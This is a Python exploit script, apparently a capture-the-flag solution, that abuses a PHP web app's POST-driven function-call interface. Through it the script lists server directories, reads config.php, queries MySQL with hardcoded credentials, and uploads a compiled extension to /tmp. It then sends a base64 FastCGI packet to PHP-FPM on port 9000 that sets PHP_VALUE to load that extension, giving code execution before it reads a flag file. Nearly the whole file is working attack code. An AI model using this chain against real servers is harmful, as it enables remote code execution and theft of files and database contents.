import requests
import inspect
import itertools

URL = "http://30.222.0.2:31493/"


def sql():
    code = """
    NEW ReflectionFunction mysqli_connect mysqli_connect
    ICALL mysqli_connect invokeArgs mysqli_arg conn
    ICALL conn query query_arg res
    CALL mysqli_fetch_all res res
    CALL var_dump res _
    """
    code = inspect.cleandoc(code)

    data = {
        "mysqli_connect": "mysqli_connect",
        "mysqli_arg": ["127.0.0.1:3306", "web", "web", "web"],
        "query_arg": "show tables",
    }
    return code, data

def scandir():
    code = """
    CALL scandir a1 r1
    CALL var_dump r1 r2
    """
    code = inspect.cleandoc(code)

    data = {
        "a1": "/var/www/html/",
    }
    return code, data


def readfile():
    code = """
    CALL file_get_contents a1 r1
    CALL var_dump r1 r2
    """
    code = inspect.cleandoc(code)

    data = {
        "a1": "/var/www/html/config.php",
    }
    return code, data


def writefile():
    code = """
    NEW ReflectionFunction a1 file_put_contents
    ICALL file_put_contents invokeArgs a2 _
    """
    code = inspect.cleandoc(code)

    data = {
        "a1": "file_put_contents",
        "a2": ["/tmp/success.txt", "success"],
    }
    return code, data


def write_ext():
    code = """
    NEW ReflectionFunction file_put_contents file_put_contents
    ICALL file_put_contents invokeArgs a2 _
    """
    code = inspect.cleandoc(code)

    ext = open("./ext.so", "rb").read()
    data = {
        "file_put_contents": "file_put_contents",
        "a2": ["/tmp/ext.so", ext],
    }
    return code, data


def fpm_attack():
    code = """
    CALL base64_decode fpm_data fpm_data

    NEW ReflectionFunction fsockopen fsockopen
    ICALL fsockopen invokeArgs fsockopen_args sock

    NEW ArrayObject arg_array arg_array
    ICALL arg_array offsetUnset offset _
    ICALL arg_array append sock _
    ICALL arg_array append fpm_data _
    CALL iterator_to_array arg_array data
    NEW ReflectionFunction fwrite fwrite
    ICALL fwrite invokeArgs data _

    CALL fflush sock _

    NEW ArrayObject arg_array_1 arg_array_1
    ICALL arg_array_1 offsetUnset offset _
    ICALL arg_array_1 append sock _
    ICALL arg_array_1 append length _
    CALL iterator_to_array arg_array_1 data
    NEW ReflectionFunction fread fread
    ICALL fread invokeArgs data socks_read

    CALL bin2hex socks_read socks_read
    CALL var_dump socks_read _

    CALL file_get_contents file_arg r1
    CALL var_dump r1 _
    """
    code = inspect.cleandoc(code)

    data = {
        "fpm_data": "AQEJAQAIAAAAAQAAAAAAAAEECQEBVAAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRSRVFVRVNUX01FVEhPRFBPU1QPDlNFUlZFUl9TT0ZUV0FSRXBocC9mY2dpY2xpZW50CwlSRU1PVEVfQUREUjEyNy4wLjAuMQsEUkVNT1RFX1BPUlQ5OTg0CwlTRVJWRVJfQUREUjEyNy4wLjAuMQsCU0VSVkVSX1BPUlQ4MAsJU0VSVkVSX05BTUVtYWctdHVyZWQPCFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xDCFDT05URU5UX1RZUEVhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQJFlBIUF9WQUxVRWV4dGVuc2lvbj0vdG1wL2V4dC5zbzsPFlBIUF9BRE1JTl9WQUxVRWV4dGVuc2lvbj0vdG1wL2V4dC5zbzsOAUNPTlRFTlRfTEVOR1RIMAEECQEAAAAAAQUJAQAAAAA=",
        "fsockopen": "fsockopen",
        "fsockopen_args": ["127.0.0.1", 9000],
        "arg_array": [""],
        "offset": 0,
        "fwrite": "fwrite",
        "arg_array_1": [""],
        "length": 8,
        "fread": "fread",
        "file_arg":"/tmp/flag.txt"

    }
    return code, data


def run(func: callable):

    def name_convert(name: str):
        match name:
            case "CALL":
                return "call"
            case "ICALL":
                return "inst_call"
            case "NEW":
                return "new"
            case _:
                return name

    def data_item(key: str, value: int | str | dict | list):
        if type(value) == int:
            return [(key, value)]
        elif type(value) == str:
            return [(key, value)]
        elif type(value) == bytes:
            return [(key, value)]
        elif type(value) == dict:
            new = []
            for k in value:
                new.append(data_item(f"{key}[{k}]", value[k]))
            return new
        elif type(value) == list:
            new = []
            if len(value) == 0:
                new.append(("array[]", ""))
            else:
                for k in range(len(value)):
                    new.append(data_item(f"{key}[{k}]", value[k]))
            return new
        raise Exception("unsupported type")

    def data_convert(data: dict):
        def flatten(something):
            if isinstance(something, (list, range)):
                for sub in something:
                    yield from flatten(sub)
            else:
                yield something

        l = []
        for k in data:
            l.append(data_item(k, data[k]))
        l = flatten(l)
        return {k[0]: k[1] for k in l}

    code, data = func()
    code = code.replace("\n\n", "\n")
    code = code.split("\n")
    code = map(lambda x: x.split(" "), code)
    code = itertools.chain.from_iterable(code)
    code = map(name_convert, code)
    code = list(code)
    code = {k: code[k] for k in range(len(code))}
    data = data_convert(data)
    code = code | data
    res = requests.post(URL, data=code)
    print(res.text)


run(sql)

